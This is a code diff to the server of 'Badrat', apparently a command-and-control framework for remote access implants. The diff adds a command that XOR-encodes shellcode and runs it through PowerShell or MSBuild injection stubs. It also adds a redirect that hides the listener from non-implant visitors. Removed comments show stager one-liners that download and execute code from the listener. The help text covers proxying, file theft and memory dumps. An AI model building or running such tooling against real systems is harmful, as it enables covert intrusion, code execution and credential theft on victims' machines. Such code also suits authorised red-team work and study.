@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 
-from flask import Flask, request
+from flask import Flask, request, redirect
 from datetime import datetime
 from itertools import cycle
 from pathlib import Path
@@ -24,10 +24,14 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-p", "--port", help="Port to start the HTTP(S) server on", default=8080, action="store", dest="port")
 parser.add_argument("-s", "--ssl", help="Start listener using HTTPS instead of HTTP (default)", default=False, action="store_true", dest="ssl")
 parser.add_argument("-v", "--verbose", help="Start Badrat in debug/verbose mode for troubleshooting", default=False, action="store_true", dest="verbose")
+parser.add_argument("-r", "--redirect", help="Website to redirect non-rat clients to", default="https://en.wikipedia.org/wiki/Rat", action="store", dest="redirect_url")
 args = parser.parse_args()
 port = args.port
 ssl = args.ssl
 verbose = args.verbose
+redirect_url = args.redirect_url
+if(not str.startswith("http://", redirect_url) or not str.startswith("https://", redirect_url)):
+    redirect_url = "http://" + redirect_url
 
 supported_types = ["c", "c#", "js", "ps1", "hta"]
 msbuild_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild"
@@ -48,7 +52,7 @@ usernames = {}
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers']
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -107,6 +111,9 @@ class Completer(object):
     def complete_csharp(self, args):
         return self._complete_path(args[0])
 
+    def complete_shellcode(self, args):
+        return self._complete_path(args[0])
+
     def complete_remove(self, args):
         return self._complete_rat(args[0])
 
@@ -147,7 +154,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.3.5 Csharp Param Fixes       "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.4.5 The Splinter Update      "`
     """
     pretty_print(banner)
 
@@ -223,8 +230,7 @@ def pretty_print(text, redraw = False):
 
 # Page sent to "unauthorized" users of the http listener
 def default_page():
-    message = "WTF who are you go away"
-    return(htmlify(message))
+    return(redirect(redirect_url))
 
 # Allow rats to call home and request more ratcode of their own type
 # Or send ad-hoc (stager) ratcode from the server.
@@ -262,6 +268,22 @@ def create_psscript(filepath, extra_cmds=""):
         b64data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
         return(b64data)
 
+def send_invoke_shellcode(input_data, ratID):
+    shellcode_path = input_data.split(" ")[1]
+    rand_classname = "C" +''.join(random.choice(alpha) for choice in range(7))
+
+    with open(os.getcwd() + "/resources/Invoke-Shellcode.ps1" , "r") as fd:
+        invoke_shellcode_data = fd.read()
+
+    with open(Path(shellcode_path).resolve() , "rb") as fd:
+        shellcode_data = fd.read()
+
+    invoke_shellcode_data = invoke_shellcode_data.replace("~~CLASSNAME~~", rand_classname)
+    invoke_shellcode_data = invoke_shellcode_data.replace("~~KEY~~", ratID)
+    invoke_shellcode_data = invoke_shellcode_data.replace("~~SHELLCODE~~", xor_crypt_and_encode(shellcode_data, ratID))
+    b64data = base64.b64encode(invoke_shellcode_data.encode('utf-8')).decode('utf-8')
+    return(b64data)
+
 def send_invoke_assembly(input_data):
     assembly_path = input_data.split(" ")[1]
 
@@ -274,6 +296,20 @@ def send_invoke_assembly(input_data):
     invoke_assembly_data = invoke_assembly_data.replace("~~ARGUMENTS~~", parse_c_sharp_args(input_data))
     invoke_assembly_data = invoke_assembly_data.replace("~~ASSEMBLY~~", base64.b64encode(assembly_data).decode('utf-8'))
     b64data = base64.b64encode(invoke_assembly_data.encode('utf-8')).decode('utf-8')
+    return(b64data)
+
+def send_shellcode_msbuild_xml(input_data, ratID):
+    shellcode_path = input_data.split(" ")[1]
+    with open(os.getcwd() + "/resources/shellcode_modified.xml", "r") as fd:
+        msbuild_data = fd.read()
+
+    with open(Path(shellcode_path).resolve() , "rb") as fd:
+        shellcode_data = fd.read()
+
+    msbuild_data = msbuild_data.replace("~~KEY~~",  ratID)
+    msbuild_data = msbuild_data.replace("~~SHELLCODE~~", xor_crypt_and_encode(shellcode_data, ratID))
+
+    b64data = base64.b64encode(msbuild_data.encode('utf-8')).decode('utf-8')
     return(b64data)
 
 def send_nps_msbuild_xml(input_data, ratID):
@@ -440,9 +476,6 @@ def serve_server(port=8080):
         pretty_print("[*] Starting " + colors("HTTP") + " listener on port " + str(port) + "\n\n")
         app.run(host="0.0.0.0", port=port)
 
-# C:\ > certreq -Post -config http://192.168.0.189:8080/kqkianehiz/b.js c:\windows\win.ini a.txt & wscript /e:jscript a.txt
-# C:\ > mshta http://192.168.0.189:8080/kqkianehiz/b.hta
-# PS C:\ > (new-object net.webclient).downloadstring('http://192.168.0.189:8080/kqkianehiz/b.ps1')|IEX
 def get_stagers(lhost):
     protocol = "http"
     if(ssl):
@@ -513,15 +546,16 @@ def get_help():
     pretty_print("")
     pretty_print("Rat commands: -- commands to interact with a badrat rat")
     pretty_print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
-    pretty_print("quit/kill_rat -- when interacting with a rat, type quit or kill_rat to task the rat to shut down")
+    pretty_print("quit -- when interacting with a rat, type quit to task the rat to shut down")
     pretty_print("spawn -- used to spawn a new rat in a new process.")
     pretty_print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
-    pretty_print("cs <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
+    pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
     pretty_print("example: cs scripts/Snaffler.exe --domain borgar.local --stdout")
-    pretty_print("up/upload -- Uploads file from C2 server to rat host")
+    pretty_print("shellcode <local_shellcode.bin_path> -- Runs the specified shellcode in a new process using MSBuild.exe and a C Sharp injection stub")
+    pretty_print("upload -- Uploads file from C2 server to rat host")
     pretty_print("example: upload scripts/Invoke-Bloodhound.ps1 C:\\users\\localadmin\\desktop\\ibh.ps1")
-    pretty_print("dl/download -- downloads the specified file from the rat host")
+    pretty_print("download -- downloads the specified file from the rat host")
     pretty_print("example: download C:\\users\\localadmin\\desktop\\minidump_660.dmp")
     pretty_print("-------------------------------------------------------------------------")
     pretty_print("")
@@ -640,6 +674,17 @@ if __name__ == "__main__":
                                     inp = "psh " + create_psscript(filepath, extra_cmds)
                                 else:
                                     inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
+                            except:
+                                pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
+                                continue
+
+                        elif(str.startswith(inp, "shellcode ")):
+                            try:
+                                filepath = inp.split(" ")[1]
+                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                    inp = "shc " +  send_invoke_shellcode(inp, ratID)
+                                else:
+                                    inp = "shc " + msbuild_path + " " + send_shellcode_msbuild_xml(inp, ratID)
                             except:
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                 continue
